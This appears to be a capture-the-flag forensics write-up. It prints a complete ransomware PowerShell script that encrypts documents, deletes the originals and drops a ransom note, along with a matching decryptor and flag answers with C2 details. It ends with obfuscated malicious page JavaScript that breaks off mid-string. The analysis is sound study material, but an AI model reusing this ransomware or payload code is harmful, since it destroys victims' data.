UtcTime: 2025-01-28 10:31:17.554 RuleName: \u0026#39;-\u0026#39; Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell -c \u0026#34;\u0026#39;JGszNFZtID0gIktpNTBlSFFnS2k1a2IyTWdLaTVrYjJONElDb3VjR1JtIg0KJG03OFZvID0gIkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFFwWlQxVlNJRVpKVEVWVElFaEJWa1VnUWtWRlRpQkZUa05TV1ZCVVJVUWdRbGtnUVNCU1FVNVRUMDFYUVZKRkNpb2dWMmhoZENCb1lYQndaVzVsWkQ4S1RXOXpkQ0J2WmlCNWIzVnlJR1pwYkdWeklHRnlaU0J1YnlCc2IyNW5aWElnWVdOalpYTnphV0pzWlNCaVpXTmhkWE5sSUhSb1pYa2dhR0YyWlNCaVpXVnVJR1Z1WTNKNWNIUmxaQzRnUkc4Z2JtOTBJ\u0026#39; | Out-File -Encoding ascii -FilePath b -NoNewline\u0026#34; Complete Malicious PowerShell Script # $k34Vm = \u0026#34;Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm\u0026#34; $m78Vo = \u0026#34;LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo=\u0026#34; $a53Va = \u0026#34;NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==\u0026#34; $b64Vb = \u0026#34;n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ\u0026#34; $e90Vg = @{} $f12Vh = @{} For ($x = 65; $x -le 90; $x++) { $e90Vg[([char]$x)] = if($x -eq 90) { [char]65 } else { [char]($x + 1) } } function n90Vp { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo)) } function l56Vn { return (a12Vc $k34Vm).Split(\u0026#34; \u0026#34;) } For ($x = 97; $x -le 122; $x++) { $e90Vg[([char]$x)] = if($x -eq 122) { [char]97 } else { [char]($x + 1) } } function a12Vc { param([string]$a34Vd) return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd)) } $c56Ve = a12Vc $a53Va $d78Vf = a12Vc $b64Vb For ($x = 48; $x -le 57; $x++) { $e90Vg[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) } } $e90Vg.GetEnumerator() | ForEach-Object { $f12Vh[$_.Value] = $_.Key } function l34Vn { param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq) $p12Vr = [byte[]]::new($m56Vo.Length) for ($x = 0; $x -lt $m56Vo.Length; $x++) { $q34Vs = $n78Vp[$x % $n78Vp.Length] $r56Vt = $o90Vq[$x % $o90Vq.Length] $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt } return $p12Vr } function s78Vu { param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx) if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) { return $null } $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw) $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx) $a34Vc = l34Vn $t90Vv $y90Va $z12Vb return [Convert]::ToBase64String($a34Vc) } function o12Vq { param([switch]$p34Vr) try { if ($p34Vr) { foreach ($q56Vs in l56Vn) { $d34Vp = \u0026#34;dca01aq2/\u0026#34; if (Test-Path $d34Vp) { Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop | Where-Object { $_.Extension -match \u0026#34;^\\.$q56Vs$\u0026#34; } | ForEach-Object { $r78Vt = $_.FullName if (Test-Path $r78Vt) { $s90Vu = [IO.File]::ReadAllBytes($r78Vt) $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf [IO.File]::WriteAllText(\u0026#34;$r78Vt.secured\u0026#34;, $t12Vv) Remove-Item $r78Vt -Force } } } } } } catch {} } if ($env:USERNAME -eq \u0026#34;developer56546756\u0026#34; -and $env:COMPUTERNAME -eq \u0026#34;Workstation5678\u0026#34;) { o12Vq -p34Vr n90Vp } Complete Python Decryption Script # import base64 import os def decode_base64(encoded_str): \u0026#34;\u0026#34;\u0026#34;Decodes a Base64 string into bytes.\u0026#34;\u0026#34;\u0026#34; return base64.b64decode(encoded_str) def xor_decrypt(data, key1, key2): \u0026#34;\u0026#34;\u0026#34;Decrypts data using XOR with two keys.\u0026#34;\u0026#34;\u0026#34; decrypted = bytearray(len(data)) for i in range(len(data)): k1 = key1[i % len(key1)] k2 = key2[i % len(key2)] decrypted[i] = data[i] ^ k1 ^ k2 return bytes(decrypted) def process_file(input_file_path, output_file_path, key1, key2): try: # Read encrypted data as Base64 string with open(input_file_path, \u0026#39;rb\u0026#39;) as file: encrypted_base64 = file.read().decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;replace\u0026#39;).strip() # Decode Base64 to bytes encrypted_data = decode_base64(encrypted_base64) # Decrypt using the keys decrypted_data = xor_decrypt(encrypted_data, key1, key2) # Save decrypted data with open(output_file_path, \u0026#39;wb\u0026#39;) as out_file: out_file.write(decrypted_data) print(f\u0026#34;Decrypted: {output_file_path}\u0026#34;) except Exception as e: print(f\u0026#34;Failed to decrypt {input_file_path}: {str(e)}\u0026#34;) def main(): # Get the directory where this script is located script_dir = os.path.dirname(os.path.abspath(__file__)) # Original Base64 keys from PowerShell key1_b64 = \u0026#34;NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==\u0026#34; key2_b64 = \u0026#34;n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ\u0026#34; # Process keys to match PowerShell\u0026#39;s behavior key1 = decode_base64(key1_b64).decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;replace\u0026#39;).encode(\u0026#39;utf-8\u0026#39;) key2 = decode_base64(key2_b64).decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;replace\u0026#39;).encode(\u0026#39;utf-8\u0026#39;) # Find all .secured files in the script directory for filename in os.listdir(script_dir): if filename.lower().endswith(\u0026#39;.secured\u0026#39;): input_path = os.path.join(script_dir, filename) output_path = os.path.join(script_dir, filename[:-8]) # Remove \u0026#34;.secured\u0026#34; (8 chars) print(f\u0026#34;\\nProcessing: {filename}\u0026#34;) process_file(input_path, output_path, key1, key2) if __name__ == \u0026#34;__main__\u0026#34;: main() Decrypted Artifact # ToolPie # In the bustling town of Eastmarsh, Garrick Stoneforge’s workshop site once stood as a pinnacle of enchanted lock and toolmaking. But dark whispers now speak of a breach by a clandestine faction, hinting that Garrick’s prized designs may have been stolen. Scattered digital remnants cling to the compromised site, awaiting those who dare unravel them. Unmask these cunning adversaries threatening the peace of Eldoria. Investigate the incident, gather evidence, and expose Malakar as the mastermind behind this attack.\nFlags:\n1. What is the IP address responsible for compromising the website? 194.59.6.66 2. What is the name of the endpoint exploited by the attacker? execute 3. What is the name of the obfuscation tool used by the attacker? Py-Fuscate 4. What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server? 13.61.7.218:55155 5. What encryption key did the attacker use to secure the data? 5UUfizsRsP7oOCAq 6. What is the MD5 hash of the file exfiltrated by the attacker? 8fde053c8e79cf7e03599d559f90b321 Analysis Overview # We are given a PCAP file. Upon inspection, we observe requests originating from the IP 194.59.6.66 (attacker-controlled) targeting a server endpoint /execute via a malicious POST payload.\nPayload Extraction # The payload is extracted and decompressed using Python:\nimport bz2 import marshal import struct import dis compressed_data = b\u0026#39;BZh91AY\u0026amp;SY\\x8d*w...\u0026#39; # Decompress the data decompressed_data = bz2.decompress(compressed_data) # Load the code object code_object = marshal.loads(decompressed_data) # Disassemble the code object to view bytecode print(\u0026#34;Disassembled Code:\u0026#34;) dis.dis(code_object) Key Findings # C2 Server: 13.61.7.218:55155 Obfuscation Tool: Py-Fuscate Encryption Algorithm: AES-CBC User/Key: Found in the packet capture (see images below). Encryption Key: 5UUfizsRsP7oOCAq Decrypting Exfiltrated Data # Using the encryption key and algorithm, we decrypt the exfiltrated data from the PCAP.\nExtract encrypted data with tshark:\ntshark -r capture.pcap -Y \u0026#34;ip.dst == 13.61.7.218 and tcp.dstport == 55155 and tcp.ack == 113\u0026#34; -T fields -e data \u0026gt; encrypted_data.txt Decryption reveals a PDF file with the MD5 hash:\n8fde053c8e79cf7e03599d559f90b321\nTales for the Brave # In Eldoria, a once-innocent website called “Tales for the Brave” has become the focus of unsettling rumors. Some claim it may secretly trap unsuspecting visitors, leading them into a complex phishing scheme. Investigators report signs of encrypted communications and stealthy data collection beneath its friendly exterior. You must uncover the truth, and protect Eldoria from a growing threat.\nFlag: HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}\nInitial Observation # The webpage appears normal but contains obfuscated JavaScript: Obfuscated Malicious JavaScript # var _$_9b39=(function(n,w){var r=n.length;var j=[];for(var e=0;e\u0026lt; r;e++){j[e]= n.charAt(e)};for(var e=0;e\u0026lt; r;e++){var d=w* (e+ 439)+ (w% 33616);var a=w* (e+ 506)+ (w% 38477);var v=d%r;var p=a%r;var x=j[v];j[v]= j[p];j[p]= x;w= (d+ a)% 3525268};var c=String.fromCharCode(127);var q=\u0026#39;\u0026#39;;var m=\u0026#39;%\u0026#39;;var t=\u0026#39;#1\u0026#39;;var o=\u0026#39;%\u0026#39;;var u=\u0026#39;#0\u0026#39;;var k=\u0026#39;#\u0026#39;;return j.join(q).split(m).join(c).split(t).join(o).split(u).join(k).split(c)})(\u0026#34;Ats8ep%%e6Sr%prB%feUseEynatcc4%ad\u0026#34;,1198358);;;;;;;;;;;;;eval(CryptoJS[_$_9b39[1]][_$_9b39[0]]({ciphertext:CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](btoa(unescape(\u0026#34;\\u0062\\u00FB\\u0033\\u00C0\\u00DC\\u005C\\u0051\\u001F\\u0062\\u00F0\\u0023\\u0053\\u0013\\u007F\\u0014\\u003D\\u0022\\u00D4\\u0049\\u009A\\u00F5\\u005B\\u0040\\u00D3\\u004B\\u008F\\u009D\\u00AC\\u00C8\\u0035\\u0009\\u0009\\u0066\\u005A\\u0086\\u0083\\u007E\\u003D\\u00CA\\u00E6\\u00CD\\u0043\\u0001\\u00ED\\u00B9\\u0020\\u0003\\u0056\\u00D3\\u0015\\u0023\\u0001\\u00AC\\u0001\\u00F9\\u009E\\u0024\\u001A\\u00BE\\u00DF\\u007F\\u004A\\u00D7\\u0030\\u0064\\u00C2\\u008F\\u00BE\\u00C9\\u0000\\u0043\\u0027\\u0070\\u00DD\\u0050\\u006B\\u00A7\\u0099\\u00AA\\u00BC\\u00BA\\u0010\\u00C3\\u0031\\u005E\\u00C3\\u00A7\\u0024\\u00C3\\u0065\\u0069\\u00DB\\u00A1\\u00A8\\u0079\\u0093\\u00E0\\u0056\\u00BD\\u00C4\\u0095\\u00A1\\u0092\\u000A\\u0046\\u007B\\u00CB\\u0076\\u00B6\\u004B\\u00EC\\u00AF\\u0070\\u0098\\u008F\\u008F\\u004B\\u0033\\u0040\\u00F0\\u0074\\u0061\\u00F9\\u0076\\u0009\\u00BF\\u0015\\u005A\\u007A\\u00BE\\u00B6\\u009D\\u0049\\u005B\\u0028\\u0028\\u000B\\u00DD\\u0043\\u0092\\u009F\\u00D6\\u0043\\u00A1\\u0083\\u002B\\u00B8\\u00E6\\u006B\\u003B\\u002C\\u000A\\u00D9\\u0019\\u0078\\u005E\\u00E8\\u0092\\u00E7\\u00FD\\u0028\\u0079\\u0046\\u004D\\u00EE\\u0074\\u00B7\\u00FD\\u0094\\u00A9\\u0084\\u00E6\\u0085\\u00A0\\u00A8\\u00E1\\u00A7\\u0044\\u009A\\u004C\\u0021\\u0050\\u0056\\u008B\\u00CC\\u00AA\\u00EF\\u0076\\u0065\\u00CD\\u0021\\u0001\\u0075\\u0041\\u006F\\u009D\\u00CB\\u006E\\u00A5\\u0055\\u00F4\\u0033\\u0043\\u000A\\u0083\\u005C\\u00F4\\u00D9\\u0025\\u008A\\u0098\\u003A\\u00C6\\u0088\\u00E1\\u0076\\u0035\\u00EF\\u00F9\\u00D4\\u00BD\\u004E\\u0048\\u0028\\u0056\\u0069\\u0040\\u003C\\u00B1\\u0086\\u009E\\u00E1\\u00D9\\u00BE\\u0084\\u005E\\u0022\\u0054\\u0026\\u00FE\\u0006\\u0022\\u0000\\u00D8\\u0083\\u0089\\u00F4\\u0075\\u0078\\u0052\\u009C\\u00DA\\u0098\\u0037\\u00BA\\u0004\\u0016\\u0046\\u00A6\\u00AD\\u0088\\u001B\\u00D4\\u0016\\u000B\\u00B6\\u00BF\\u002F\\u0061\\u00C9\\u009A\\u0056\\u0048\\u001C\\u0085\\u0080\\u006D\\u0031\\u0066\\u00F9\\u00FA\\u002F\\u00F1\\u0036\\u0079\\u0020\\u00E7\\u00B2\\u002F\\u00B6\\u00B9\\u001E\\u00A7\\u00AC\\u0097\\u00C5\\u0015\\u008B\\u00CA\\u005A\\u008A\\u009A\\u0033\\u001D\\u003E\\u0086\\u006F\\u0015\\u0043\\u0076\\u0067\\u000A\\u00D0\\u0007\\u009B\\u00A1\\u00BB\\u002F\\u0026\\u00CA\\u0030\\u00EB\\u0023\\u0093\\u00C7\\u001D\\u00AC\\u0057\\u0073\\u002F\\u0028\\u004A\\u00A5\\u00EC\\u00D1\\u005B\\u0045\\u0077\\u0030\\u0047\\u0008\\u0097\\u00C4\\u003B\\u001C\\u00CB\\u00E9\\u0033\\u00E9\\u0013\\u007B\\u00F6\\u00D1\\u00A4\\u000A\\u00AA\\u0090\\u008E\\u0041\\u005E\\u000F\\u00FA\\u00AB\\u00F4\\u0068\\u0087\\u00C8\\u009C\\u00A6\\u0037\\u0083\\u00EC\\u0021\\u0056\\u00D8\\u00B1\\u0095\\u0010\\u00CC\\u008D\\u0023\\u000F\\u0074\\u002F\\u007B\\u0085\\u0037\\u006C\\u00D8\\u00C8\\u000C\\u006A\\u003A\\u00B3\\u0071\\u0029\\u00AC\\u00B9\\u004D\\u0011\\u00EF\\u0097\\u00F8\\u00E2\\u0044\\u00E5\\u00BF\\u00FC\\u0053\\u00CF\\u0026\\u00CE\\u00F2\\u0046\\u0059\\u0017\\u004D\\u008B\\u00F1\\u002C\\u0089\\u00E1\\u0056\\u0040\\u0058\\u00A8\\u00AC\\u009B\\u00F2\\u0063\\u0086\\u0085\\u0073\\u009F\\u00B4\\u00B5\\u00B3\\u0041\\u0037\\u00F8\\u0034\\u009C\\u00F4\\u0088\\u0059\\u00D0\\u008E\\u004A\\u00B5\\u00C6\\u0066\\u0044\\u0042\\u0026\\u00F2\\u0008\\u0090\\u00F8\\u0075\\u00A5\\u006C\\u0041\\u008D\\u00B8\\u0061\\u00D4\\u00E8\\u0089\\u00DD\\u0087\\u0087\\u0014\\u00C9\\u0093\\u0013\\u00FC\\u007D\\u007E\\u00E5\\u0048\\u0043\\u002E\\u002E\\u004D\\u00E6\\u0078\\u00FA\\u00A1\\u00F7\\u008F\\u0095\\u00EC\\u00B3\\u006F\\u003A\\u00CF\\u00A7\\u00BF\\u00F3\\u0051\\u0094\\u008B\\u007C\\u00A0\\u0030\\u009B\\u0019\\u00C0\\u00FE\\u003B\\u0052\\u0041\\u00CB\\u00AF\\u0008\\u00E2\\u00A8\\u00A3\\u0027\\u0075\\u00DE\\u00A8\\u00FF\\u005C\\u0054\\u008B\\u0069\\u0019\\u00F5\\u007B\\u00A0\\u00CF\\u0065\\u0079\\u00B6\\u00FC\\u0099\\u0037\\u0043\\u007C\\u00CD\\u007F\\u0068\\u00E6\\u00D3\\u00E7\\u0084\\u0093\\u0010\\u0088\\u000F\\u00B8\\u0040\\u001D\\u001B\\u0038\\u00CA\\u0010\\u0043\\u0003\\u0094\\u00BD\\u0076\\u00AF\\u000C\\u000D\\u00DA\\u009D\\u0049\\u000B\\u005F\\u003E\\u00A2\\u00F3\\u00D5\\u0045\\u00F8\\u00DD\\u001E\\u0057\\u0003\\u0053\\u0044\\u006B\\u009E\\u003B\\u00A7\\u00DF\\u004A\\u001A\\u0040\\u0094\\u0080\\u00EC\\u00E8\\u009B\\u0010\\u00E6\\u0040\\u0079\\u0057\\u0020\\u009F\\u00FF\\u001F\\u0042\\u006D\\u0057\\u0055\\u00A1\\u003F\\u0091\\u006E\\u00D7\\u00F7\\u00A2\\u0089\\u00F2\\u007A\\u000D\\u0088\\u005E\\u00CE\\u002D\\u00C5\\u00C3\\u0001\\u0071\\u002A\\u007A\\u003D\\u009C\\u00F5\\u00C3\\u0080\\u00CA\\u002D\\u0069\\u004B\\u005B\\u0061\\u00CD\\u0055\\u000F\\u009C\\u00C6\\u00E6\\u00FB\\u0038\\u00A1\\u00FB\\u00D1\\u00BA\\u0062\\u00BE\\u0031\\u0072\\u00EF\\u00C0\\u00D6\\u0056\\u00FF\\u00DA\\u00FE\\u00CA\\u0081\\u0001\\u0072\\u00BC\\u0025\\u0079\\u00B8\\u007F\\u0055\\u00C5\\u0071\\u008C\\u000C\\u00D4\\u0059\\u0030\\u0022\\u00CC\\u00C8\\u005D\\u005B\\u0077\\u0009\\u00A2\\u0038\\u0054\\u0013\\u003F\\u00BC\\u00CD\\u001F\\u0039\\u00DE\\u001A\\u0046\\u0057\\u0016\\u0045\\u001F\\u00FF\\u001E\\u002F\\u002C\\u0032\\u00EA\\u0029\\u0035\\u00A1\\u008B\\u001B\\u00F7\\u0048\\u00D6\\u000A\\u004C\\u009F\\u0044\\u0093\\u00D2\\u002B\\u0023\\u00F9\\u0022\\u0044\\u001C\\u0012\\u00D6\\u0061\\u0097\\u00AF\\u004B\\u001E\\u00DC\\u000E\\u0033\\u00F3\\u00A1\\u00FA\\u0050\\u00CE\\u0000\\u0024\\u0086\\u00C9\\u0045\\u0061\\u00A7\\u00BC\\u0074\\u0096\\u0058\\u0087\\u00B6\\u00D4\\u006A\\u0087\\u00BB\\u0027\\u00D8\\u00B6\\u0045\\u007D\\u0030\\u0097\\u0089\\u005D\\u0034\\u0023\\u0042\\u005B\\u003D\\u00A0\\u0012\\u00F3\\u0032\\u00EA\\u0040\\u006B\\u0023\\u00EA\\u00A9\\u003D\\u006C\\u0013\\u009B\\u007A\\u0096\\u00CA\\u0023\\u00CC\\u009C\\u001A\\u0083\\u0058\\u0004\\u0098\\u005F\\u008B\\u0048\\u0001\\u0091\\u00CF\\u008F\\u00D0\\u004F\\u0092\\u0015\\u0076\\u00C0\\u0078\\u0072\\u000D\\u0071\\u0001\\u0022\\u0063\\u00B6\\u007D\\u00E9\\u00D3\\u004B\\u00A7\\u008F\\u00ED\\u00F7\\u0016\\u00AB\\u002D\\u00B9\\u0001\\u00F2\\u008B\\u00E9\\u002F\\u0062\\u00EE\\u003C\\u008D\\u0040\\u0016\\u00C0\\u00A7\\u0017\\u0065\\u00B9\\u002F\\u009E\\u00DC\\u00E4\\u00BC\\u00FD\\u00E7\\u0023\\u002C\\u0066\\u000A\\u0024\\u008C\\u00F2\\u00E4\\u00AE\\u00A3\\u00C1\\u0068\\u007D\\u001E\\u0058\\u000F\\u0081\\u00D5\\u0047\\u0010\\u005B\\u000A\\u002A\\u00B6\\u0041\\u003A\\u00A8\\u001D\\u00DD\\u0091\\u0008\\u007C\\u005D\\u00E1\\u0013\\u0002\\u0004\\u00B8\\u0087\\u00FA\\u0019\\u0009\\u00B8\\u00C1\\u0044\\u005D\\u006E\\u007D\\u000E\\u0092\\u001E\\u0034\\u008D\\u0076\\u00B7\\u00D4\\u009E\\u0059\\u004C\\u00CD\\u0011\\u002D\\u0047\\u00A0\\u00EA\\u002A\\u0098\\u0039\\u00A5\\u00DF\\u008F\\u0041\\u00FF\\u0000\\u00C6\\u003B\\u00E0\\u0025\\u00F4\\u0005\\u00C0\\u00FB\\u005B\\u0013\\u0090\\u0038\\u00FA\\u0031\\u0037\\u00BA\\u0011\\u006E\\u00DB\\u009A\\u00BD\\u0074\\u004F\\u0047\\u0039\\u00B8\\u0047\\u001E\\u00F6\\u00BF\\u0008\\u00E7\\u0029\\u004A\\u0031\\u00C8\\u009F\\u0099\\u0045\\u009A\\u00B4\\u00FF\\u0009\\u0052\\u00BC\\u00FE\\u00C3\\u006A\\u0092\\u007D\\u000E\\u00E4\\u00A8\\u000B\\u007E\\u0054\\u000E\\u0088\\u00B2\\u0058\\u00F5\\u00DD\\u0044\\u0054\\u00F9\\u0067\\u0072\\u00B0\\u00DD\\u00F6\\u0047\\u00C3\\u00D5\\u00A3\\u00AE\\u003C\\u0051\\u003E\\u00DE\\u0019\\u00BC\\u0041\\u0065\\u0024\\u0067\\u0045\\u0075\\u002E\\u0008\\u0086\\u00AF\\u0037\\u00CD\\u008B\\u0000\\u0062\\u0063\\u0069\\u00C4\\u003B\\u0065\\u00F7\\u008A\\u00C9\\u0043\\u00FC\\u005E\\u0080\\u0058\\u0046\\u002A\\u0059\\u0074\\u00D0\\u0041\\u00D3\\u0069\\u0027\\u0045\\u0053\\u0001\\u00A7\\u00F4\\u0065\\u003C\\u00D5\\u00CE\\u008E\\u0066\\u0077\\u00A1\\u00D8\\u003B\\u00EA\\u0054\\u003F\\u003B\\u00EE\\u00E8\\u00BD\\u00B6\\u0040\\u00FE\\u0009\\u0071\\u00DA\\u001B\\u007F\\u00D4\\u0019\\u003E\\u0065\\u0062\\u00F1\\u00CA\\u00EB\\u0073\\u0004\\u0061\\u00A4\\u00B6\\u006B\\u0002\\u0082\\u00AA\\u00DA\\u00DA\\u00FA\\u007B\\u0093\\u005E\\u0053\\u0080\\u0049\\u0017\\u008E\\u00ED\\u00EF\\u0058\\u0016\\u005D\\u0041\\u006C\\u0015\\u0088\\u0088\\u0085\\u00A6\\u004D\\u0003\\u00A8\\u0014\\u001C\\u000B\\u0085\\u0049\\u0042\\u006A\\u00DA\\u006C\\u00CD\\u00DD\\u00C3\\u0049\\u00F7\\u00E4\\u0049\\u0049\\u0027\\u0018\\u00E4\\u00A8\\u0045\\u0069\\u00F5\\u000A\\u0009\\u0045\\u00CD\\u00BC\\u0075\\u0047\\u009A\\u0056\\u00BE\\u002A\\u0026\\u00C0\\u00E8\\u007C\\u004E\\u000D\\u003B\\u00E8\\u0017\\u00BA\\u0098\\u008D\\u0008\\u0062\\u0047\\u00EC\\u00D4\\u0005\\u00AD\\u003D\\u0094\\u008B\\u00A0\\u0023\\u0054\\u0016\\u00A9\\u0022\\u00E9\\u00DD\\u007A\\u0046\\u00D1\\u0022\\u0074\\u0020\\u0006\\u004B\\u006F\\u0099\\u003F\\u004E\\u00B1\\u001C\\u00D6\\u0081\\u00D9\\u001C\\u003D\\u0099\\u0086\\u00EA\\u00EF\\u0084\\u0088\\u0044\\u0060\\u004D\\u0048\\u0039\\u0099\\u0015\\u00D8\\u00D4\\u0029\\u009F\\u00E2\\u0056\\u00E4\\u001A\\u0008\\u0049\\u00A3\\u009C\\u0056\\u00AE\\u00AC\\u0052\\u0089\\u0002\\u00D8\\u00FB\\u007E\\u0078\\u006D\\u00AF\\u00E9\\u0065\\u0020\\u00A4\\u00C0\\u0013\\u007D\\u00C0\\u0085\\u0072\\u00CF\\u00FB\\u00DD\\u00F9\\u00C3\\u00A7\\u0097\\u000E\\u0048\\u003D\\u00ED\\u00A8\\u0055\\u00FA\\u0070\\u00F3\\u001F\\u0034\\u0012\\u00E1\\u00C4\\u000D\\u00A1\\u0055\\u000F\\u008D\\u0000\\u0039\\u00BE\\u0070\\u0078\\u0005\\u0051\\u0030\\u00BA\\u0023\\u00C2\\u00F8\\u006F\\u0045\\u0098\\u00B5\\u00BE\\u00A5\\u0031\\u0007\\u0078\\u0097\\u0078\\u00B8\\u002E\\u00C0\\u0069\\u0037\\u0099\\u0019\\u00E3\\u007D\\u0025\\u0003\\u002B\\u00EF\\u0008\\u00AD\\u0055\\u0094\\u00E2\\u009F\\u0008\\u0016\\u0078\\u0029\\u00A7\\u0067\\u0059\\u006A\\u000F\\u0080\\u008D\\u00A4\\u001F\\u0003\\u00BD\\u00AE\\u0071\\u0057\\u0043\\u0049\\u00D4\\u0034\\u0012\\u00AD\\u0069\\u00E3\\u0085\\u001F\\u002B\\u0063\\u00BB\\u00A7\\u00DF\\u005C\\u00C6\\u000C\\u0076\\u000B\\u0006\\u003F\\u00D9\\u0086\\u00B5\\u00D4\\u0095\\u00D8\\u0064\\u00E4\\u00FA\\u00F8\\u0038\\u0023\\u008D\\u00E6\\u00A8\\u0022\\u00B6\\u0047\\u00DD\\u005E\\u00D6\\u00CE\\u001D\\u0084\\u003E\\u0088\\u00A5\\u00C7\\u0071\\u004E\\u0009\\u00CA\\u0023\\u00A6\\u0078\\u00FD\\u00C2\\u0053\\u003F\\u00FE\\u00A1\\u002B\\u0051\\u0000\\u00E6\\u00FF\\u00C5\\u0045\\u0073\\u00BA\\u0061\\u004A\\u00AE\\u00C8\\u00CF\\u0006\\u0036\\u0044\\u00FE\\u0072\\u00BF\\u00B1\\u005C\\u0051\\u00EB\\u0003\\u00C9\\u00F3\\u0020\\u00B8\\u0071\\u00FA\\u0046\\u009D\\u001A\\u00D4\\u000F\\u0072\\u0082\\u0094\\u0045\\u0016\\u000E\\u00AA\\u00F6\\u00E2\\u000E\\u00A1\\u001B\\u008C\\u000A\\u0082\\u0049\\u003E\\u0093\\u00CB\\u0087\\u00CB\\u00E9\\u009C\\u00B0\\u0030\\u0036\\u007A\\u00A6\\u002A\\u0016\\u0020\\u00DB\\u00B1\\u009E\\u008E\\u0003\\u00A8\\u008E\\u005B\\u005B\\u0099\\u001C\\u00EA\\u002E\\u00AB\\u000D\\u005D\\u00A3\\u00A0\\u00E8\\u00CA\\u00D7\\u000B\\u0081\\u003D\\u002F\\u0039\\u0083\\u006F\\u006B\\u000D\\u003A\\u0025\\u00CC\\u00EE\\u00DE\\u006C\\u0037\\u007D\\u0044\\u0062\\u0062\\u0033\\u0047\\u0082\\u00D9\\u000D\\u00A3\\u0095\\u00E1\\u00F5\\u0043\\u00F3\\u00A4\\u00F3\\u006E\\u0071\\u0019\\u0021\\u00D6\\u009E\\u000C\\u0080\\u0007\\u00E7\\u0076\\u0034\\u00AC\\u0019\\u0021\\u0019\\u002B\\u00D3\\u00C2\\u00F2\\u0072\\u002B\\u00C6\\u00A8\\u0043\\u00F6\\u00D9\\u00B9\\u004F\\u0067\\u0097\\u0093\\u007B\\u0040\\u001E\\u0004\\u0020\\u00FC\\u003F\\u00D3\\u00AD\\u0079\\u006E\\u00E9\\u008C\\u00C7\\u00EA\\u00A7\\u0009\\u0054\\u009D\\u0030\\u0088\\u0044\\u0016\\u0017\\u0061\\u00DC\\u00F6\\u0057\\u00C5\\u0080\\u001B\\u0000\\u0026\\u0033\\u0034\\u0079\\u009C\\u0021\\u00BC\\u00A7\\u0032\\u0083\\u00D7\\u0082\\u00CA\\u0029\\u0031\\u0000\\u0085\\u0031\\u0045\\u0009\\u0002\\u00D9\\u00F8\\u0025\\u00D8\\u00E4\\u0019\\u0003\\u00FA\\u00B8\\u00A5\\u009B\\u0093\\u001F\\u00FC\\u00E6\\u002F\\u00F0\\u0018\\u00A3\\u0021\\u00E4\\u0071\\u001D\\u0018\\u0014\\u00E9\\u0027\\u007A\\u0070\\u0072\\u00D7\\u002D\\u00E2\\u00A7\\u0048\\u00F7\\u009F\\u0072\\u00E2\\u00C7\\u0094\\u00A9\\u00D4\\u00E7\\u0004\\u0092\\u00F1\\u0076\\u001D\\u0031\\u00E7\\u009D\\u00D3\\u0087\\u00EF\\u00D4\\u00D8\\u00C5\\u001F\\u00FF\\u008B\\u00E9\\u0041\\u00EA\\u00E9\\u002D\\u005A\\u006C\\u00A8\\u008E\\u0076\\u0072\\u0072\\u0015\\u003C\\u00E6\\u0004\\u0005\\u00A1\\u00C7\\u0001\\u00EF\\u00BB\\u0055\\u006E\\u0030\\u0017\\u00E4\\u0076\\u00F9\\u00FA\\u002C\\u0064\\u008D\\u00AE\\u000D\\u0097\\u00D